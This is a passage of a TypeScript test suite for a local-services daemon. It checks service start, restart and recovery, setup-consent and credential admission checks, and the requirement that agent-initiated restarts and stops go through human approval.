            expect(await h.routes.startTarget!(request, h.ingress, { ...h.context, actionRequestId: 'flox-second-start' })).toMatchObject({ status: 'succeeded' });
            phase = 'second native Running observation';
            await expect.poll(async () => (await status()).find(service => service.name === 'worker')?.status, { timeout: 30_000 }).toBe('Running');
            // Graceful daemon restart retires owned trees, unlike detached Compose adoption.
            phase = 'daemon owner retirement';
            await h.owner.retireProjectServices();
            await expect.poll(async () => (await status()).every(service => service.pid === null), { timeout: 30_000 }).toBe(true);
            const recoveredOwner = createManagedServicesOwner({ processSupervisorHost: createManagedServiceProcessSupervisorHost({ custodyOwner: 'daemon' }),
                dependencies: Object.freeze({}) as never, resolveScope: scope => scope });
            cleanups.push(() => recoveredOwner.dispose());
            const recoveredStarter = createProjectServiceDeclarationStarter({ resolveRuntime: async () => h.runtime,
                acquirePluginRuntime: async () => ({ registry: { projectManagedServices: recoveredOwner }, release: async () => {} }) });
            phase = 'fresh owner recovery';
            const recoveredContext = { ...h.context, actionRequestId: 'flox-recovered-start' };
            const resolved = await recoveredStarter.resolveStartTarget(request, h.ingress, recoveredContext);
            if (!resolved.ok) throw new Error(resolved.reasonCode);
            expect(await recoveredStarter.startManagedDeclaration(resolved.declaration, request, h.ingress, recoveredContext)).toMatchObject({ status: 'succeeded' });
            const recoveredHandle = recoveredOwner.listProjectServices()[0]!;
            expect(recoveredHandle.instanceId).not.toBe(handle.instanceId);
            expect(await recoveredHandle.stop()).toEqual({ status: 'stopped' });
            await expect.poll(async () => (await status()).every(service => service.pid === null), { timeout: 30_000 }).toBe(true);
        } finally {
            await native(['services', 'stop', '--dir', h.root]);
            await h.owner.retireProjectServices();
            await expect.poll(async () => (await status()).every(service => service.pid === null), { timeout: 30_000 }).toBe(true);
        }
    }, 120_000);

    it.each([
        [{ kind: 'pluginNative', adapter: { pluginId: 'acme.native', localId: 'service' }, file: 'service.json', target: 'web' }, 'native_service_instance_unavailable'],
    ])('refuses a detached source lacking an actual native instance/lifecycle witness', async (source, reasonCode) => {
        const h = await fixture(false, source);
        expect(await h.starter.resolveStartTarget(h.request, h.ingress, h.context)).toMatchObject({ ok: false, reasonCode });
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    it('keeps setup consent separate and refuses foreign requester credentials before reading Home', async () => {
        const h = await fixture(true);
        // Accepted declaration discovery has already read the owner's rows.
        // Measure only this foreign request's admission boundary.
        h.post.mockClear();
        expect(await h.starter.resolveStartTarget(h.request, { ...h.ingress, machineAdmission: { ...h.ingress.machineAdmission!, actorAccountId: 'teammate' } }, h.context))
            .toMatchObject({ ok: false, reasonCode: 'project_requester_credentials_unavailable' });
        expect(h.post).not.toHaveBeenCalled();
        expect(await h.starter.resolveStartTarget(h.request, h.ingress, h.context)).toMatchObject({ ok: false, reasonCode: 'project_setup_consent_required' });
        expect(h.owner.listProjectServices()).toEqual([]);
        expect(h.setupProcesses).toEqual([]);
    });

    it.each([false, true])('waits for setup PTY exit and carries an autostart collision (%s)', async childCollision => {
        const h = await fixture(true);
        const port = 4321;
        const failureCause = { phase: 'managed_service.establishment', errorClass: 'Error', errorCode: 'port_in_use', httpStatus: null };
        const establishmentFailure = { cause: 'port_in_use', port, sameProject: false };
        if (childCollision) {
            await writeFile(join(h.root, '.happier/project.json'), JSON.stringify(ProjectManifestV1Schema.parse({
                ...h.manifest, services: { ...h.manifest.services,
                    web: { source: { kind: 'command', command: 'serve web' }, runtime: { autostart: true } },
                },
            })));
        }
        const context = { ...h.context, executeHostReviewedChildAction: async (_action: string, input: unknown) => {
            // The addressed child Machine returns its native Start receipt.
            expect(input).toMatchObject({ machineId: h.workspace.machineId, declaration: { selection: { name: 'web' } } });
            return { ok: true as const, result: { protocolVersion: 1, machineId: h.workspace.machineId, targetId: 'web',
                status: 'failed', reasonCode: 'deployment_port_in_use', failureCause, establishmentFailure,
                snapshot: { v: 1, machineId: h.workspace.machineId, updatedAt: 1, targets: [] },
            } };
        } };
        const setupReview = await h.starter.resolveStartTarget(h.request, h.ingress, h.context);
        if (setupReview.ok || setupReview.reasonCode !== 'project_setup_consent_required' || !setupReview.reviewedEffectDigest) throw new Error('Expected setup review');
        // The Home boundary now reports the pre-existing approved D18 setup row, not a Service trust grant.
        h.trustSetupDigest(setupReview.reviewedEffectDigest);
        const serviceReview = await h.selectStart();
        const request = { ...h.request, expectedEffectDigest: serviceReview.reviewedEffectDigest };
        const resolved = await h.starter.resolveStartTarget(request, h.ingress, h.context);
        if (!resolved.ok) throw new Error(resolved.reasonCode);
        let finished = false;
        const completion = h.starter.startManagedDeclaration(resolved.declaration, request, h.ingress, context).then(result => { finished = true; return result; });
        // The exit subscription is the admitted setup's real signal: a poll can
        // time out under load or exit the PTY before the waiter subscribes.
        await Promise.race([h.setupStarted, completion]);
        expect(h.setupProcesses).toHaveLength(1);
        expect(h.owner.listProjectServices()).toEqual([]);
        expect(finished).toBe(false);
        expect(h.setupProcesses[0]?.params).toMatchObject({ args: ['-c', 'echo setup'], options: { cwd: h.root } });
        h.setupProcesses[0]!.pty.exit(0);
        if (childCollision) {
            expect(await completion).toMatchObject({ status: 'denied', reasonCode: 'deployment_port_in_use', failureCause, establishmentFailure });
            expect(h.owner.listProjectServices()).toEqual([]);
            return;
        }
        expect(await completion).toMatchObject({ status: 'succeeded', currentTarget: { kind: 'managed_service', machineId: 'machine' } });
        expect(h.owner.listProjectServices()[0]?.snapshot()).toMatchObject({ state: 'running', baseUrl: null });
        await h.owner.listProjectServices()[0]?.stop();
    });
    it.each(['rpc', 'agent', 'restart-waived-agent', 'waived-agent'] as const)('restarts the exact occurrence through fresh Start admission on %s, retaining independent Start approval', async policy => {
        const surface = policy === 'rpc' ? 'rpc' : 'agent';
        const settings = normalizeActionsSettingsV1({ v: 1, actions: {}, approvalWaivedSurfaces: {
            ...(policy === 'restart-waived-agent' || policy === 'waived-agent' ? { 'localServices.actions.restartManaged': ['agent'] } : {}),
            ...(policy === 'waived-agent' ? { 'localServices.launcher.start': ['agent'] } : {}),
        } });
        const h = await fixture();
        const review = await h.selectStart();
        if (!review.reviewedEffectDigest) throw new Error('Expected current Service review');
        expect(await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context))
            .toMatchObject({ status: 'succeeded' });
        const original = h.owner.listProjectServices()[0]!;
        const actionRoutes = createLocalServiceActionRoutes({ machineId: 'machine', projectManagedServices: h.owner,
            inventoryRegistry: createLocalServiceInventoryRegistry(), restartManagedService: h.starter.restartManagedService,
            prepareRestartManagedService: h.starter.prepareRestartManagedService,
            verifyConfirmationNonce: request => request.confirmationNonce === createLocalServiceActionConfirmationNonceV1(request) });
        const featureGate = createLocalServicesDaemonFeatureGate({ env: {}, resolveServerFeaturesSnapshot: () => ({ status: 'ready',
            features: FeaturesResponseSchema.parse({ features: { localServices: { enabled: true, inventory: { enabled: true },
                managed: { enabled: true }, actions: { enabled: true }, launcher: { enabled: true } },
                    browser: { enabled: true, viewTargets: { enabled: true } } }, capabilities: {} }) }) });
        await featureGate.refresh();
        const approvals: string[] = [];
        let artifact: ReturnType<typeof ApprovalRequestV2Schema.parse> | undefined;
        const executor = createActionExecutor({
            ...createCliActionDeps({ token: h.runtime.credentials.token, credentials: h.runtime.credentials,
                serverId: 'home', serverHttpBaseUrl: 'https://home.example', sessionId: 'cli-global', mode: 'plain', ctx: null }),
            prepareHostReviewedChildren: createLocalServicesDaemonRestartPreparation({ featureGate, ingress: h.ingress,
                routes: { launcherRoutes: h.routes, actionRoutes } }),
            prepareLocalServiceStartApproval: ({ input, context, executeCanonicalAction }) =>
                h.routes.prepareStartApproval!(input, h.ingress, context, executeCanonicalAction),
            runtimeActionExecute: createLocalServicesDaemonRuntimeActionExecutor({ featureGate, ingress: h.ingress,
                routes: { launcherRoutes: h.routes, actionRoutes } }),
            readActionsSettings: () => settings,
            approvalsCreate: async ({ request }) => { artifact = ApprovalRequestV2Schema.parse(request);
                approvals.push(request.actionId); return { artifactId: 'restart-review' }; },
            approvalsGet: async () => artifact ?? null,
            approvalsUpdate: async ({ request }) => { artifact = ApprovalRequestV2Schema.parse(request); return { ok: true }; },
            isApprovalExecutionOriginCurrent: async () => true });
        const request = { requestId: 'restart-service', action: 'restart_managed' as const, force: false,
            expectedEffectDigest: review.reviewedEffectDigest,
            target: { kind: 'managed_service' as const, machineId: 'machine', managedServiceId: original.instanceId,
                workspaceId: h.workspace.id, declaration: h.request.declaration, cwd: h.root } };
        const context = { ...h.context, serverIdentityId: h.serverIdentityId, runtimeAccountId: 'owner',
            actionRequestId: request.requestId, surface, actionsSettings: settings };
        if (policy === 'rpc') {
            await writeFile(join(h.root, '.happier/project.json'), JSON.stringify({ ...h.manifest,
                services: { ...h.manifest.services, worker: { source: { kind: 'command', command: 'different reviewed effect' } } } }));
            expect(await executor.execute('localServices.actions.restartManaged',
                { ...request, confirmationNonce: createLocalServiceActionConfirmationNonceV1(request) }, context))
                .toMatchObject({ ok: true, result: { status: 'denied', reasonCode: 'project_service_effect_changed' } });
            expect(original.snapshot().state).toBe('running');
            expect(approvals).toEqual([]);
            await writeFile(join(h.root, '.happier/project.json'), JSON.stringify(h.manifest));
        }
        const result = await executor.execute('localServices.actions.restartManaged',
            { ...request, confirmationNonce: createLocalServiceActionConfirmationNonceV1(request) }, context);
        if (surface === 'agent' && policy !== 'waived-agent') {
            expect(result, JSON.stringify(result)).toMatchObject({ ok: true,
                result: { kind: 'approval_request_created', actionId: 'localServices.actions.restartManaged' } });
            expect(approvals).toEqual(['localServices.actions.restartManaged']);
            expect(original.snapshot().state).toBe('running');
            expect(h.owner.listProjectServices()).toEqual([original]);
            expect(await executor.execute('approval.request.decide', { artifactId: 'restart-review', decision: 'approve' }, {
                ...context, surface: 'ui', authority: 'present_user', runtimeAccountId: 'owner',
            })).toMatchObject({ ok: true });
            expect(artifact?.execution, JSON.stringify(artifact?.execution)).toMatchObject({ ok: true, result: { status: 'succeeded' } });
        } else {
            expect(result, JSON.stringify(result)).toMatchObject({ ok: true, result: { status: 'succeeded' } });
            expect(approvals).toEqual([]);
        }
        expect(original.snapshot().state).toBe('stopped');
        expect(h.owner.listProjectServices()[0]?.instanceId).not.toBe(original.instanceId);
        expect(h.owner.listProjectServices()[0]?.snapshot().state).toBe('running');
    });
    it('settles a refused Restart preparation without opening a generic approval or stopping the original Service', async () => {
        const h = await fixture();
        const review = await h.selectStart();
        expect(await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context))
            .toMatchObject({ status: 'succeeded' });
        const original = h.owner.listProjectServices()[0]!;
        const actionRoutes = createLocalServiceActionRoutes({ machineId: 'machine', projectManagedServices: h.owner,
            inventoryRegistry: createLocalServiceInventoryRegistry(), restartManagedService: h.starter.restartManagedService,
            prepareRestartManagedService: h.starter.prepareRestartManagedService,
            verifyConfirmationNonce: request => request.confirmationNonce === createLocalServiceActionConfirmationNonceV1(request) });
        const gate = createLocalServicesDaemonFeatureGate({ env: {}, resolveServerFeaturesSnapshot: () => ({ status: 'ready',
            features: FeaturesResponseSchema.parse({ features: { localServices: { enabled: true, inventory: { enabled: true },
                managed: { enabled: true }, actions: { enabled: true }, launcher: { enabled: true } },
                browser: { enabled: true, viewTargets: { enabled: true } } }, capabilities: {} }) }) });
        await gate.refresh();
        const transport = h.post.getMockImplementation()!;
        h.post.mockImplementation(async (url, body, options) => String(url).includes('/account/project-rows/')
            ? { status: 403, data: { error: 'forbidden' } } : transport(url, body, options));
        const approvals: string[] = [];
        const executor = createActionExecutor({
            ...createCliActionDeps({ token: h.runtime.credentials.token, credentials: h.runtime.credentials,
                serverId: 'home', serverHttpBaseUrl: 'https://home.example', sessionId: 'cli-global', mode: 'plain', ctx: null }),
            prepareHostReviewedChildren: createLocalServicesDaemonRestartPreparation({ featureGate: gate,
                ingress: h.ingress, routes: { actionRoutes } }),
            approvalsCreate: async ({ request }) => { approvals.push(request.actionId); return { artifactId: 'unusable-review' }; },
        });
        const request = { requestId: 'refused-restart', action: 'restart_managed' as const, force: false,
            target: { kind: 'managed_service' as const, machineId: 'machine', managedServiceId: original.instanceId } };
        const context = { ...h.context, serverIdentityId: h.serverIdentityId, runtimeAccountId: 'owner',
            actionRequestId: request.requestId, surface: 'ui' as const, authority: 'present_user' as const };
        const input = { ...request, confirmationNonce: createLocalServiceActionConfirmationNonceV1(request) };
        const preparation = await createLocalServicesDaemonRestartPreparation({ featureGate: gate,
            ingress: h.ingress, routes: { actionRoutes } })({ actionId: 'localServices.actions.restartManaged', input, context });
        expect(preparation, JSON.stringify(preparation)).toMatchObject({ ok: true, result: { status: 'denied', reasonCode: 'project_account_rows_unavailable' } });
        const result = await executor.execute('localServices.actions.restartManaged', input, context);
        expect(result, JSON.stringify(result)).toMatchObject({ ok: true, result: { status: 'denied', reasonCode: 'project_account_rows_unavailable' } });
        expect(approvals).toEqual([]);
        expect(original.snapshot().state).toBe('running');
        await original.stop();
    });
    it('keeps the legacy Machine control transport behind the same current Agent approval policy', async () => {
        const h = await fixture();
        const review = await h.selectStart();
        if (!review.reviewedEffectDigest) throw new Error('Expected current Service effect');
        expect(await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context))
            .toMatchObject({ status: 'succeeded' });
        const handle = h.owner.listProjectServices()[0]!;
        const actionRoutes = createLocalServiceActionRoutes({ machineId: 'machine', projectManagedServices: h.owner,
            inventoryRegistry: createLocalServiceInventoryRegistry(),
            verifyConfirmationNonce: request => request.confirmationNonce === createLocalServiceActionConfirmationNonceV1(request) });
        const gate = createLocalServicesDaemonFeatureGate({ env: {}, resolveServerFeaturesSnapshot: () => ({ status: 'ready',
            features: FeaturesResponseSchema.parse({ features: { localServices: { enabled: true, inventory: { enabled: true },
                actions: { enabled: true }, managed: { enabled: true } } }, capabilities: {} }) }) });
        await gate.refresh();
        const rpc = new RpcHandlerManager({ scopePrefix: 'machine', localMachineId: 'machine', encryptionMode: 'plain' });
        const approvals: string[] = [];
        registerDaemonLocalServicesMachineRpcHandlers(rpc, { machineId: 'machine', serverId: 'home', localServicesActions: actionRoutes,
            resolveLauncherActionExecutor: ({ ingress }) => {
                const executor = createActionExecutor({
                    ...createCliActionDeps({ token: h.runtime.credentials.token, credentials: h.runtime.credentials,
                        serverId: 'home', serverHttpBaseUrl: 'https://home.example', sessionId: 'cli-global', mode: 'plain', ctx: null }),
                    runtimeActionExecute: createLocalServicesDaemonRuntimeActionExecutor({
                        featureGate: gate, ingress, routes: { actionRoutes } }),
                    readActionsSettings: () => normalizeActionsSettingsV1(null),
                    approvalsCreate: async ({ request }) => { approvals.push(request.actionId); return { artifactId: 'stop-review' }; },
                    approvalsUpdate: async () => ({ ok: true }),
                    approvalsWaitForDecision: async ({ request }) => ({ decision: 'reject' as const, request, decisionAuthority: 'present_user' as const }) });
                return { execute: (actionId, input, context) => executor.execute(actionId, input, { serverId: 'home', ...context }) };
            } });
        const request = { requestId: 'legacy-stop', action: 'stop_managed' as const, force: false,
            target: { kind: 'managed_service' as const, machineId: 'machine', managedServiceId: handle.instanceId,
                workspaceId: h.workspace.id, declaration: h.request.declaration, cwd: h.root } };
        expect(await rpc.invokeLocal(RPC_METHODS.DAEMON_LOCAL_SERVICES_ACTIONS_EXECUTE,
            { ...request, confirmationNonce: createLocalServiceActionConfirmationNonceV1(request) },
            { localActionContext: { surface: 'agent', authority: 'account_automation', actionRequestId: request.requestId } }))
            .toMatchObject({ kind: 'approval_request_created', artifactId: 'stop-review', actionId: 'localServices.actions.stopManaged' });
        expect(approvals).toEqual(['localServices.actions.stopManaged']);
        expect(handle.snapshot().state).toBe('running');
    });
    it.each(['rpc', 'ui'] as const)('reaches fresh replacement through the actual receiving Machine Restart Action handler on %s', async surface => {
        const h = await fixture();
        let captureAvailable = false;
        // The plugin contribution is an external runtime boundary. Keep the
        // launch composition, process, feed and reviewed Restart path real.
        const capturedLaunches: unknown[] = [];
        const captureUnavailable = {
            kind: 'unavailable', code: 'service_launch_environment_unavailable',
            reason: 'private launch detail', diagnostic: { code: 'telemetry_capture_unavailable',
                message: "Capture isn't available: the listener port is already in use." },
        } as const;
        if (surface === 'ui') h.setServiceLaunchEnvironmentContribution(async launch => {
            capturedLaunches.push(launch);
            return [{
                contribution: { pluginId: 'fixture.capture', localId: 'capture' },
                result: captureAvailable ? { kind: 'replace', defaults: { OTEL_SERVICE_NAME: 'fixture-service' }, release: async () => {} }
                    : captureUnavailable,
            }];
        });
        const channel = await createRequesterCurrentnessSocketHarness();
        cleanups.push(() => channel.close());
        const review = await h.selectStart();
        if (!review.reviewedEffectDigest) throw new Error('Expected Service effect review');
        expect(await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context))
            .toMatchObject({ status: 'succeeded' });
        const old = h.owner.listProjectServices()[0]!;
        const selectedRow = LocalServiceLauncherSnapshotV1Schema.parse(await h.routes.getSnapshot({ workspaceRoot: h.root }))
            .targets.find(target => target.sourceClass?.kind === 'managed_service' && target.sourceClass.managedServiceId === old.instanceId);
        if (selectedRow?.sourceClass?.kind !== 'managed_service') throw new Error('Expected the selected running service row');
        if (surface === 'ui') {
            const selection = h.request.declaration?.selection;
            if (selection?.kind !== 'manifest') throw new Error('Expected a declared Project service');
            expect(capturedLaunches).toEqual([expect.objectContaining({ serviceName: selection.name })]);
            expect(selectedRow).toMatchObject({ serviceState: 'running', actions: expect.arrayContaining(['manage']),
                diagnostics: [{ ...captureUnavailable.diagnostic, severity: 'warning' }] });
            expect(JSON.stringify(selectedRow)).not.toContain(captureUnavailable.reason);
            captureAvailable = true;
        }
        const actionRoutes = createLocalServiceActionRoutes({ machineId: 'machine', projectManagedServices: h.owner,
            inventoryRegistry: createLocalServiceInventoryRegistry(), restartManagedService: h.starter.restartManagedService,
            prepareRestartManagedService: h.starter.prepareRestartManagedService,
            verifyConfirmationNonce: request => request.confirmationNonce === createLocalServiceActionConfirmationNonceV1(request) });
        const featureGate = createLocalServicesDaemonFeatureGate({ env: {}, resolveServerFeaturesSnapshot: () => ({ status: 'ready',
            features: FeaturesResponseSchema.parse({ features: { localServices: { enabled: true, inventory: { enabled: true },
                managed: { enabled: true }, actions: { enabled: true }, launcher: { enabled: true } },
                browser: { enabled: true, viewTargets: { enabled: true } } }, capabilities: {} }) }) });
        await featureGate.refresh();
        const rpc = new RpcHandlerManager({ scopePrefix: 'machine', localMachineId: 'machine', encryptionMode: 'plain',
            authorizeRequest: request => authorizeMachineRpcRequest(request, { machineId: 'machine',
                resolveCustodianAccountId: async () => 'owner', resolveInstallationId: () => 'installation',
                resolveHomeServerIdentityId: async () => h.serverIdentityId,
                verifyMachineAdmission: async () => true }) });
        const signingKey = nacl.sign.keyPair();
        const homePost = h.post.getMockImplementation()!;
        h.post.mockImplementation(async (url, body, options) => {
            if (String(url).endsWith(bindExternalActionExecutionAuthorizationVerifyHttpPathV1('approval.request.create'))
                || String(url).endsWith(bindExternalActionExecutionAuthorizationVerifyHttpPathV1('localServices.actions.restartManaged'))) {
                ExternalActionExecutionAuthorizationVerifyRequestV1Schema.parse(body);
                return { status: 200, data: { ok: true } };
            }
            return homePost(url, body, options);
        });
        const approvals: string[] = [];
        let artifact: ReturnType<typeof ApprovalRequestV2Schema.parse> | undefined;
        let receivingActionExecutor: Pick<ReturnType<typeof createActionExecutor>, 'execute'> | undefined;
        registerDaemonLocalServicesMachineRpcHandlers(rpc, { machineId: 'machine', serverId: 'home', localServicesActions: actionRoutes,
            resolveLauncherActionExecutor: ({ ingress }) => {
                const executor: ReturnType<typeof createActionExecutor> = createActionExecutor({
                    ...createCliActionDeps({ token: h.runtime.credentials.token, credentials: h.runtime.credentials,
                        serverId: 'home', serverHttpBaseUrl: 'https://home.example', sessionId: 'cli-global', mode: 'plain', ctx: null }),
                    prepareHostReviewedChildren: createLocalServicesDaemonRestartPreparation({ featureGate, ingress,
                        routes: { launcherRoutes: h.routes, actionRoutes } }),
                    prepareLocalServiceStartApproval: ({ input, context, executeCanonicalAction }) =>
                        h.routes.prepareStartApproval!(input, ingress, context, executeCanonicalAction),
                    approvalsCreate: async ({ request }) => { artifact = ApprovalRequestV2Schema.parse(request);
                        approvals.push(request.actionId); return { artifactId: 'received-restart-review' }; },
                    approvalsGet: async () => artifact ?? null,
                    approvalsUpdate: async ({ request }) => { artifact = ApprovalRequestV2Schema.parse(request); return { ok: true }; },
                    isApprovalExecutionOriginCurrent: async () => true,
                    prepareApprovalExecutionAuthorization: createDaemonApprovalExecutionAuthorizationPreparer({
                        machineId: 'machine', serverId: 'home', serverBaseUrl: 'https://home.example',
                        daemonWorkSignal: h.ingress.signal!,
                        prepareRequesterAccountContext: request => prepareRequesterAccountActionContext({ ...request,
                            purpose: request.purpose ?? { kind: 'external_action' }, machineId: 'machine',
                            installationId: h.ingress.machineAdmission!.installationId, installationPrivateKey: signingKey.secretKey,
                            serverId: 'home', serverIdentityId: h.serverIdentityId, serverHttpBaseUrl: 'https://home.example',
                            ownCredentials: h.runtime.credentials, isCurrent: async () => true,
                            createExecutor: () => executor }),
                    }),
                    runtimeActionExecute: createLocalServicesDaemonRuntimeActionExecutor({ featureGate, ingress,
                        routes: { launcherRoutes: h.routes, actionRoutes } }) });
                receivingActionExecutor = { execute: (actionId, input, context) => executor.execute(actionId, input, { serverId: 'home', ...context,
                    actionsSettings: context?.actionsSettings ?? normalizeActionsSettingsV1(null),
                    signExternalActionApprovalInput: args => signExternalActionApprovalInputV1({ ...args,
                        authorizationToken: args.authorization.token, privateKey: signingKey.secretKey }) }) };
                return receivingActionExecutor;
            } });
        registerActionSpecRpcHandlers({ rpcHandlerManager: rpc, actionIds: ['approval.request.create'],
            targetMachineId: 'machine', defaultMachineTarget: true,
            resolveActionExecutor: () => {
                if (!receivingActionExecutor) throw new Error('Expected receiving Restart executor');
                return receivingActionExecutor;
            } });
        const request = { requestId: 'received-restart', action: 'restart_managed' as const, force: false,
            expectedEffectDigest: review.reviewedEffectDigest,
            target: { kind: 'managed_service' as const, machineId: 'machine',
                managedServiceId: selectedRow.sourceClass.managedServiceId,
                workspaceId: h.workspace.id, declaration: h.request.declaration, cwd: h.root } };
        const input = { ...request, confirmationNonce: createLocalServiceActionConfirmationNonceV1(request) };
        const context = { surface: 'ui' as const, authority: 'present_user' as const, serverId: 'home',
            actionCaller: { kind: 'host' as const }, runtimeAccountId: 'owner', serverIdentityId: h.serverIdentityId,
            actionRequestId: request.requestId, actionsSettings: normalizeActionsSettingsV1(null) };
        const result = surface === 'ui' ? await executeMachineActionAtDaemon('localServices.actions.restartManaged', input, context,
            async (actionInput, reviewDigest) => {
                const actionId = 'localServices.actions.restartManaged';
                // The confirmed press is a fresh transport invocation of the exact reviewed input.
                const envelope = ExternalActionRequestEnvelopeV1Schema.parse({ v: 1,
                    requestId: `${request.requestId}-${reviewDigest ? 'confirmed' : 'initial'}`, target: { kind: 'machine', machineId: 'machine' }, input: actionInput });
                const authorization = ExternalActionExecutionAuthorizationV1Schema.parse({ v: 1, token: 'home-verified-received-restart', binding: {
                    accountId: 'owner', custodianAccountId: 'owner', authentication: { kind: 'account', tokenEpoch: 1 },
                    serverIdentityId: h.serverIdentityId, machineId: 'machine', installationId: h.ingress.machineAdmission!.installationId,
                    actionId, requestId: envelope.requestId, target: envelope.target, accountEncryptionMode: 'plain',
                    admittedMachineRole: 'manage', requestEnvelopeDigest: computeExternalActionRequestEnvelopeDigestV1(envelope),
                } });
                const addressedContext = { ...context, actionRequestId: envelope.requestId,
                    externalActionTarget: envelope.target };
                const receive = (digest?: string, confirmed = false) => rpc.invokeLocal(getActionSpec(actionId).bindings!.rpcMethod!, actionInput, {
                    rpcContext: { ...h.ingress, callerAuthority: 'present_user', originalActionEnvelope: envelope },
                    // As in the UI transport, bind the native decision before Home adds its signed authorization.
                    localActionContext: { ...(confirmed
                        ? bindPresentUserActionConfirmation(actionId, actionInput, addressedContext, digest) : addressedContext),
                        externalActionExecutionAuthorization: authorization },
                });
                if (reviewDigest) {
                    expect(await receive('A'.repeat(43), true)).toMatchObject({ ok: false,
                        errorCode: 'action_interactive_review_required', details: { reviewDigest,
                            review: { preview: { hostReviewedChildren: { children: [{ action: 'localServices.launcher.start' }] } } } } });
                    expect(old.snapshot().state).toBe('running');
                    expect(approvals).toEqual([]);
                }
                const received = await receive(reviewDigest, !!reviewDigest);
                if (!reviewDigest) {
                    expect(received, JSON.stringify({ received, approvals })).toMatchObject({ ok: false, errorCode: 'action_interactive_review_required' });
                    expect(old.snapshot().state).toBe('running');
                    expect(approvals).toEqual([]);
                }
                return received;
            }, async ({ preview }) => {
                // Native presentation is the human boundary; admission and consequence matching remain real.
                expect(preview).toMatchObject({ hostReviewedChildren: { children: [{ action: 'localServices.launcher.start' }] } });
                expect(old.snapshot().state).toBe('running');
                return true;
            }) : await rpc.handleRequest({ method: 'machine:daemon.localServices.actions.restartManaged', params: input,
            requestId: request.requestId, callerAuthority: 'present_user', machineAdmission: h.ingress.machineAdmission });
        if (surface === 'ui') {
            expect(result, JSON.stringify({ result, approvals })).toMatchObject({ ok: true, result: { status: 'succeeded' } });
            expect(approvals).toEqual([]);
        } else expect(result, JSON.stringify({ surface, result, approvals })).toMatchObject({ status: 'succeeded' });
        expect(old.snapshot().state).toBe('stopped');
        expect(h.owner.listProjectServices()[0]?.instanceId).not.toBe(old.instanceId);
        expect(h.owner.listProjectServices()[0]?.snapshot().state).toBe('running');
        if (surface === 'ui') {
            const newTarget = LocalServiceLauncherSnapshotV1Schema.parse(await h.routes.getSnapshot({ workspaceRoot: h.root }))
                .targets.find(target => target.sourceClass?.kind === 'managed_service'
                    && target.sourceClass.managedServiceId === h.owner.listProjectServices()[0]?.instanceId);
            expect(newTarget).toMatchObject({ serviceState: 'running' });
            expect(newTarget?.diagnostics).toBeUndefined();
        }
    });
});
